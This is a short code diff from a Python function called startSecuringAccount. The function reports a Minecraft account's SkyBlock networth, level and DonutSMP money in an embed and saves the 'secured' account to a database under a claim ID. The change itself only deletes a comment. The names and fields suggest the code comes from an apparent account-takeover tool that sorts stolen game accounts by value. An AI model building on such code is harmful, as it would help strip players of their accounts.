@@ -82,8 +82,7 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
     stats_embed.add_field(name="SB NW", value=f'${simplify(hstats["networth"])}', inline=True)
     stats_embed.add_field(name="SB LVL", value=f'{simplify(hstats["slevel"])}', inline=True)
     stats_embed.add_field(name="Donut NW", value=f'{simplify(dstats["result"]["money"]) if dstats and dstats != "Failed" else 0}', inline=True)
-
-    # Generate a unique claim ID for this secured account
+    
     claim_id = uuid.uuid4().hex[:8]
     with DBConnection() as database:
         database.addSecuredAccount(claim_id, account)
